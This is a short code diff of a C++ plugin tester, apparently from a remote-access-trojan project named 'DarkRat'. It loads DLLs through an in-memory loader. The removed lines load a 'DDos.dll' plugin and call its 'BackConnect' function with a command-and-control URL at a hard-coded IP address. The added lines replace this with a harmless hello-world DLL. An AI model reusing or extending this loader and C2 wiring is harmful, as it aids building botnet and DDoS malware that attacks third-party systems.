@@ -20,9 +20,9 @@ int _tmain(int argc, _TCHAR* argv[])
 	HANDLE hLibrary = 0;
 
 	//hLibrary = lib.LoadFromMemory(test, sizeof(test)); // loaded the dll from byte array.
-	hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\DDos.dll"); // loaded the dll from byte array.
-	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "BackConnect");
-	fn("http://35.204.128.99/ddoscontroll");
+	hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\ExampleTask.dll"); // loaded the dll from byte array.
+	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
+	fn("");
 	lib.FreeLibraryFromMemory(hLibrary);
 	return 0;
 }
